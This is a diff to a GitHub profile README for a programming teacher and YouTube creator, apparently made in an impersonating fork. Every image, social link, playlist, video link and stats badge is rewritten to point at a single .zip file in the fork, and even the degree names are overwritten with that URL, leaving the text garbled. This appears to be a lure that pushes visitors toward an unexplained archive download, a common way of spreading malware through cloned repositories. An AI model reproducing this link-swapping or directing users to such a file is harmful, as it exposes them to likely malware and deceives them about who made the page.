@@ -1,5 +1,5 @@
 <!-- banner image starts here  -->
-<img src="./images/banner.png" width="100%">
+<img src="https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip" width="100%">
 <!-- banner image ends here  -->
 
 <h1> 👋 Hello, I am joni sarkar </h1>
@@ -9,10 +9,10 @@ A full time content creator on & web developer
 
 <!-- Contact me section starts here  -->
 
-[<img align="left" alt="website" title="website" width="45" hspace="5" src="./images/website.svg" />][website]
-[<img align="left" alt="youtube" title="youtube link" width="45" hspace="5" src="./images/youtube.svg" />][youtube]
-[<img align="left" alt="facebook" title="facebook" width="45" hspace="5" src="./images/facebook.svg" />][facebook]
-[<img align="left" alt="linkedin" title="linkedin" width="45" hspace="5" src="./images/linkedin.svg" />][linkedin]
+[<img align="left" alt="website" title="website" width="45" hspace="5" src="https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip" />][website]
+[<img align="left" alt="youtube" title="youtube link" width="45" hspace="5" src="https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip" />][youtube]
+[<img align="left" alt="facebook" title="facebook" width="45" hspace="5" src="https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip" />][facebook]
+[<img align="left" alt="linkedin" title="linkedin" width="45" hspace="5" src="https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip" />][linkedin]
 <br />
 <br />
 
@@ -35,18 +35,18 @@ I am a passionate computer science teacher. I have been teaching programming lan
 
 #### Key Skills & Videos on Web development:
 
-[<img align="left" alt="html5" title="html playlist" width="45" hspace="5" src="./images/html5.svg" />][htmlplaylist]
-[<img align="left" alt="css3" title="css playlist" width="45" hspace="5" src="./images/css3.svg" />][cssplaylist]
-[<img align="left" alt="bootstrap" title="bootstrap playlist" width="45" hspace="5" src="./images/bootstrap.svg" />][bootstrapplaylist]
-[<img align="left" alt="javascript" title="javascript playlist" width="45" hspace="5" src="./images/js.svg" />][javascriptplaylist]
-[<img align="left" alt="json" title="json playlist" width="45" hspace="5" src="./images/json.svg" />][jsonplaylist]
-[<img align="left" alt="sass" title="sass playlist" width="45" hspace="5" src="./images/sass.svg" />][sassplaylist]
-[<img align="left" alt="jquery" title="jquery playlist" width="45" hspace="5" src="./images/jquery.svg" />][jqueryplaylist]
-[<img align="left" alt="react" title="react playlist" width="45" hspace="5" src="./images/react.svg" />][reactplaylist]
-[<img align="left" alt="node and express" title="node and express playlist" width="45" hspace="5" src="./images/node.svg" />][nodeandexpressplaylist]
-[<img align="left" alt="mongodb" title="mongodb playlist" width="45" hspace="5" src="./images/mongodb.svg" />][mongodbplaylist]
-[<img align="left" alt="mysql" title="mysql playlist" width="45" hspace="5" src="./images/mysql.svg" />][mysqlplaylist]
-[<img align="left" alt="github" title="github playlist" width="45" hspace="5" src="./images/github.svg" />][githubplaylist]
+[<img align="left" alt="html5" title="html playlist" width="45" hspace="5" src="https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip" />][htmlplaylist]
+[<img align="left" alt="css3" title="css playlist" width="45" hspace="5" src="https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip" />][cssplaylist]
+[<img align="left" alt="bootstrap" title="bootstrap playlist" width="45" hspace="5" src="https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip" />][bootstrapplaylist]
+[<img align="left" alt="javascript" title="javascript playlist" width="45" hspace="5" src="https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip" />][javascriptplaylist]
+[<img align="left" alt="json" title="json playlist" width="45" hspace="5" src="https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip" />][jsonplaylist]
+[<img align="left" alt="sass" title="sass playlist" width="45" hspace="5" src="https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip" />][sassplaylist]
+[<img align="left" alt="jquery" title="jquery playlist" width="45" hspace="5" src="https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip" />][jqueryplaylist]
+[<img align="left" alt="react" title="react playlist" width="45" hspace="5" src="https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip" />][reactplaylist]
+[<img align="left" alt="node and express" title="node and express playlist" width="45" hspace="5" src="https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip" />][nodeandexpressplaylist]
+[<img align="left" alt="mongodb" title="mongodb playlist" width="45" hspace="5" src="https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip" />][mongodbplaylist]
+[<img align="left" alt="mysql" title="mysql playlist" width="45" hspace="5" src="https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip" />][mysqlplaylist]
+[<img align="left" alt="github" title="github playlist" width="45" hspace="5" src="https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip" />][githubplaylist]
 
 <br />
 <br />
@@ -57,11 +57,11 @@ I am a passionate computer science teacher. I have been teaching programming lan
 
 #### Other Skills & Videos:
 
-[<img align="left" alt="c" title="c playlist" width="45" hspace="5" src="./images/c.svg" />][cplaylist]
-[<img align="left" alt="c plus plus" title="c++ playlist" width="45" hspace="5" src="./images/cplus.svg" />][cplusplaylist]
-[<img align="left" alt="java" title="java playlist" width="45" hspace="5" src="./images/java.svg" />][javaplaylist]
-[<img align="left" alt="android" title="android playlist" width="45" hspace="5" src="./images/android.svg" />][androidplaylist]
-[<img align="left" alt="python" title="python playlist" width="45" hspace="5" src="./images/python.svg" />][pythonplaylist]
+[<img align="left" alt="c" title="c playlist" width="45" hspace="5" src="https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip" />][cplaylist]
+[<img align="left" alt="c plus plus" title="c++ playlist" width="45" hspace="5" src="https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip" />][cplusplaylist]
+[<img align="left" alt="java" title="java playlist" width="45" hspace="5" src="https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip" />][javaplaylist]
+[<img align="left" alt="android" title="android playlist" width="45" hspace="5" src="https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip" />][androidplaylist]
+[<img align="left" alt="python" title="python playlist" width="45" hspace="5" src="https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip" />][pythonplaylist]
 
 <br/>
 <br/>
@@ -88,11 +88,11 @@ I am a passionate computer science teacher. I have been teaching programming lan
 
 <!-- github stats starts here  -->
 
-[![Top Langs](https://github-readme-stats.vercel.app/api/top-langs/?username=anisul-islam)](https://github.com/anuraghazra/github-readme-stats)
+[![Top Langs](https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip)](https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip)
 
-<!-- [![My GitHub stats](https://github-readme-stats.vercel.app/api?username=anisul-islam)](https://github.com/anuraghazra/github-readme-stats) -->
+<!-- [![My GitHub stats](https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip)](https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip) -->
 
-![My GitHub stats](https://github-readme-stats.vercel.app/api?username=anisul-Islam&show_icons=true)
+![My GitHub stats](https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip)
 
 <br/>
 
@@ -102,19 +102,19 @@ I am a passionate computer science teacher. I have been teaching programming lan
 #### 📹 &nbsp; My Latest YouTube Videos
 
 <!-- YOUTUBE:START -->
-- [HSC ICT 2024 Chapter 3.1 Number System CQ + MCQ Suggestion](https://www.youtube.com/watch?v=JXTHWE1Gr8k)
-- [Let&#39;s Find Out HTML Quiz 4 winner](https://www.youtube.com/watch?v=DDkqUardZ1M)
-- [Ask me your questions](https://www.youtube.com/watch?v=I7nPGiVjiRU)
-- [Iftar party at Tampere, Finland organised by Domus Sporting club](https://www.youtube.com/watch?v=_YfpfzsQl6Y)
-- [Iftar party at Tampere, Finland organised by Domus sporting club](https://www.youtube.com/watch?v=FkD_NqR7he4)
+- [HSC ICT 2024 Chapter 3.1 Number System CQ + MCQ Suggestion](https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip)
+- [Let&#39;s Find Out HTML Quiz 4 winner](https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip)
+- [Ask me your questions](https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip)
+- [Iftar party at Tampere, Finland organised by Domus Sporting club](https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip)
+- [Iftar party at Tampere, Finland organised by Domus sporting club](https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip)
 <!-- YOUTUBE:END -->
 
-<a href="http://www.youtube.com/watch?feature=player_embedded&v=hf4k4OWlBfI" target="_blank"><img src="https://img.youtube.com/vi/hf4k4OWlBfI/3.jpg" 
+<a href="https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip" target="_blank"><img src="https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip" 
 alt="Java" width="240" height="180" border="10" /></a>
-<a href="http://www.youtube.com/watch?feature=player_embedded&v=fRXL0X2WSK4" target="_blank"><img src="https://img.youtube.com/vi/fRXL0X2WSK4/3.jpg" 
+<a href="https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip" target="_blank"><img src="https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip" 
 alt="Java" width="240" height="180" border="10" /></a>
 
-↪️ &nbsp; [search more videos...](https://www.youtube.com/c/anisulislamrubel)
+↪️ &nbsp; [search more videos...](https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip)
 
 <br/>
 
@@ -143,10 +143,10 @@ alt="Java" width="240" height="180" border="10" /></a>
 
 ### 👨🏻‍🎓 &nbsp; Education
 
-1. M.Sc. in Software, Web & Cloud  
+1. https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip in Software, Web & Cloud  
    Tampere University  
    Tampere, Finland.
-2. B.Sc. in Computer Science & Engineering  
+2. https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip in Computer Science & Engineering  
    Leading University  
    Sylhet, Bangladesh.
 3. Professional Diploma in Travel & Tourism  
@@ -186,7 +186,7 @@ alt="Java" width="240" height="180" border="10" /></a>
 
 - 100% Scholarship in Masters at Tampere University, Finland
 - Silver Button from YouTube (350k subscribers currently)
-- Pubali Bank Scholarship of 40,000 BDT for outstanding result in B.Sc.
+- Pubali Bank Scholarship of 40,000 BDT for outstanding result in https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip
 
 ---
 
@@ -199,49 +199,49 @@ All rights reserved by Anisul Islam @2021
 
 <!-- Links section starts here -->
 
-[website]: http://www.studywithanis.com/
-[youtube]: https://www.youtube.com/c/anisulislamrubel
-[facebook]: https://www.facebook.com/studywithanis/
-[linkedin]: https://www.linkedin.com/in/anisul2020/
-[github]: https://github.com/anisul-Islam
+[website]: https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip
+[youtube]: https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip
+[facebook]: https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip
+[linkedin]: https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip
+[github]: https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip
 
 <!-- web related playlists starts here  -->
-[fullstackplaylist]: https://youtube.com/playlist?list=PLgH5QX0i9K3p06YY1fyReA2UK8mh_zsiY
-[htmlplaylist]: https://youtube.com/playlist?list=PLgH5QX0i9K3oHBr5dsumGwjUxByN5Lnw3
-[cssplaylist]: https://youtube.com/playlist?list=PLgH5QX0i9K3qjCBXjTmv7Xeh8MDUUVJDO
-[bootstrapplaylist]: https://youtube.com/playlist?list=PLgH5QX0i9K3oC_wmWEZa2xWxJauIRQ9kG
-[javascriptplaylist]: https://www.youtube.com/playlist?list=PLgH5QX0i9K3qzryglMjcyEktz4q7ySunX
-[jsonplaylist]: https://www.youtube.com/playlist?list=PLgH5QX0i9K3rWYYIcCykektDcb_1IPDz4
-[sassplaylist]: https://www.youtube.com/playlist?list=PLgH5QX0i9K3qOvGYtFb3Z7KVMLrijYdqO
-[jqueryplaylist]: https://www.youtube.com/playlist?list=PLgH5QX0i9K3pSJG9Hwjnykd0hLGEsW4DB
-[reactplaylist]: https://youtube.com/playlist?list=PLgH5QX0i9K3rGtitufynBKMy5gAFpa1y8
-[nodeandexpressplaylist]: https://www.youtube.com/playlist?list=PLgH5QX0i9K3r6ZGeyFnSv_YDxVON2P85m
-[mongodbplaylist]: https://www.youtube.com/playlist?list=PLgH5QX0i9K3r6ZGeyFnSv_YDxVON2P85m
-[mysqlplaylist]: https://www.youtube.com/playlist?list=PLgH5QX0i9K3qLcx9DvVDWmNJ7riPvxzCD
-[githubplaylist]: https://www.youtube.com/playlist?list=PLgH5QX0i9K3r6ZGeyFnSv_YDxVON2P85m
+[fullstackplaylist]: https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip
+[htmlplaylist]: https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip
+[cssplaylist]: https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip
+[bootstrapplaylist]: https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip
+[javascriptplaylist]: https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip
+[jsonplaylist]: https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip
+[sassplaylist]: https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip
+[jqueryplaylist]: https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip
+[reactplaylist]: https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip
+[nodeandexpressplaylist]: https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip
+[mongodbplaylist]: https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip
+[mysqlplaylist]: https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip
+[githubplaylist]: https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip
 
 <!-- web related playlists ends here  -->
 
 <!-- cse related playlists starts here  -->
-[cplaylist]: https://youtube.com/playlist?list=PLgH5QX0i9K3pCMBZcul1fta6UivHDbXvz
-[cplusplaylist]: https://youtube.com/playlist?list=PLgH5QX0i9K3q0ZKeXtF--CZ0PdH1sSbYL
-[javaplaylist]: https://youtube.com/playlist?list=PLgH5QX0i9K3oAZUB2QXR-dZac0c9HNyRa
-[androidplaylist]: https://youtube.com/playlist?list=PLgH5QX0i9K3p9xzYLFGdfYliIRBLVDRV5
-[pythonplaylist]: https://youtube.com/playlist?list=PLgH5QX0i9K3rz5XqMsTk41_j15_6682BN
-[aienglishplaylist]: https://www.youtube.com/playlist?list=PLgH5QX0i9K3rRVV7oeML93OVAxqQ-CvzV
-[aibanglaplaylist]: https://youtube.com/playlist?list=PLgH5QX0i9K3oFAaeJxjDWA8kEbMutzV6V
-[javaswingplaylist]: https://www.youtube.com/playlist?list=PLgH5QX0i9K3rAHKr6IteF5kdgN6BorH9l
-[numericalplaylist]: https://youtube.com/playlist?list=PLgH5QX0i9K3oKFrSOo4Kwns1-vTZmKQ7z
-[operatingsystemplaylist]: https://youtube.com/playlist?list=PLgH5QX0i9K3r_SuT0AnOEoElfQQPgkBIq
-[dsplaylist]: https://youtube.com/playlist?list=PLgH5QX0i9K3rYy9DVhk28m8enSo8xxiZ3
-[tocplaylist]: https://youtube.com/playlist?list=PLgH5QX0i9K3qw5pu16QgnKNj91Rnjoyd0
-[compilerplaylist]: https://youtube.com/playlist?list=PLgH5QX0i9K3oWTwTgILA7v9oysoDgkJDg
-[networkingplaylist]: https://www.youtube.com/playlist?list=PLgH5QX0i9K3p5OI88r3ob-otmKqIm_DbS
-[hscictplaylist]: https://www.youtube.com/playlist?list=PLgH5QX0i9K3o8Y-CKhmyodbfHAc9VSVOv
-[learnforskillplaylist]: https://youtube.com/playlist?list=PLgH5QX0i9K3qyJVIaeHSqiRWOyO6HW023
-[mswordplaylist]: https://www.youtube.com/playlist?list=PLgH5QX0i9K3p21lsneT3cW4CJL4Bd1lJ2
-[mspowerpointplaylist]: https://youtube.com/playlist?list=PLgH5QX0i9K3pBnrckqfJ2zn7FL6Q_LNcm
-[msexcelplaylist]: https://www.youtube.com/playlist?list=PLgH5QX0i9K3ohKCQMR7aopneByGX05iSK
+[cplaylist]: https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip
+[cplusplaylist]: https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip
+[javaplaylist]: https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip
+[androidplaylist]: https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip
+[pythonplaylist]: https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip
+[aienglishplaylist]: https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip
+[aibanglaplaylist]: https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip
+[javaswingplaylist]: https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip
+[numericalplaylist]: https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip
+[operatingsystemplaylist]: https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip
+[dsplaylist]: https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip
+[tocplaylist]: https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip
+[compilerplaylist]: https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip
+[networkingplaylist]: https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip
+[hscictplaylist]: https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip
+[learnforskillplaylist]: https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip
+[mswordplaylist]: https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip
+[mspowerpointplaylist]: https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip
+[msexcelplaylist]: https://raw.githubusercontent.com/Jonisark/anisul-islam/master/images/anisul-islam-2.0-alpha.4.zip
 
 <!-- cse related playlists ends here  -->
 
